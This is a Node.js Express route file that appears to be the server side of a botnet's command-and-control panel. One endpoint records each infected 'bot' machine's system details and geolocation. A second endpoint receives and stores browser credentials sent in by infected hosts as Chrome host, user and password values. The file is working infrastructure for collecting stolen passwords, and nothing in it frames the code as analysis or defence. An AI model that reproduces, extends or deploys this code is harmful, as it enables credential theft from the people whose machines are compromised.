const db = require("../../models");
const ip = require("../../scripts/ip.js");
const v = require("../../scripts/verifier.js");

module.exports = (application) => {
    application.post("/update/details/:identifier", async (req, res) => {
        const { identifier } = req.params;
        const { token } = req.body;
        const postdata = req.body;
        if (identifier && token && Object.keys(postdata).length > 1) {
            const verify = await v.validate(identifier, token);
            if (verify) {
                const ipAddress = "78.87.194.58";
                let ipInfo = await ip.info(ipAddress);
                ipInfo = ipInfo.data;

                let options = {};

                options.ipAddress = ipAddress;
                options.country = ipInfo.country;
                options.countryCode = ipInfo.countryCode;
                options.region = ipInfo.regionName;
                options.regionCode = ipInfo.region;
                options.city = ipInfo.city;
                options.lat = ipInfo.lat;
                options.lon = ipInfo.lon;
                options.isp = ipInfo.isp;

                if (postdata.operating_system) {
                    options.operatingSystem = postdata.operating_system;
                }

                if (postdata.node_name) {
                    options.nodeName = postdata.node_name;
                }

                if (postdata.release) {
                    options.release = postdata.release;
                }

                if (postdata.version) {
                    options.version = postdata.version;
                }

                if (postdata.processor) {
                    options.processor = postdata.processor;
                }

                if (postdata.architecture) {
                    options.architecture = postdata.architecture;
                }

                if (postdata.boot_time) {
                    options.bootTime = postdata.boot_time;
                }

                if (postdata.memory) {
                    options.memory = postdata.memory;
                }

                db.Bots.update(options, {
                    where: {
                        identifier: identifier,
                    },
                }).then(() => {
                    res.status(200).json({
                        message: "Update OK",
                    });
                });
            } else {
                res.status(401).json({
                    message: "Bot not found or token/id is invalid",
                });
            }
        } else {
            res.status(403).json({
                message: "Missing token/id or not enough POST fields",
            });
        }
    });

    application.post("/update/chrome/:identifier", async (req, res) => {
        const { identifier } = req.params;
        const { token } = req.body;
        const postdata = req.body;
        if (identifier && token && Object.keys(postdata).length != 4) {
            const verify = await v.validate(identifier, token);
            if (verify) {
                db.Chrome.findAll({
                    where: {
                        identifier: identifier,
                        host: postdata.host,
                    },
                }).then((results) => {
                    if (results.length > 0) {
                        db.Chrome.update(
                            {
                                identifier: identifier,
                                host: postdata.host,
                                user: postdata.user,
                                password: postdata.password,
                            },
                            {
                                where: {
                                    identifier: identifier,
                                    host: postdata.host,
                                },
                            }
                        ).then(() => {
                            res.status(200).json({
                                message: "Chrome details updated",
                            });
                        });
                    } else {
                        db.Chrome.create({
                            identifier: identifier,
                            host: postdata.host,
                            user: postdata.user,
                            password: postdata.password,
                        }).then(() => {
                            res.status(200).json({
                                message: "Chrome details created",
                            });
                        });
                    }
                });
            } else {
                res.status(401).json({
                    message: "Bot not found or token/id is invalid",
                });
            }
        } else {
            res.status(403).json({
                message: "Missing token/id or not enough POST fields",
            });
        }
    });
};
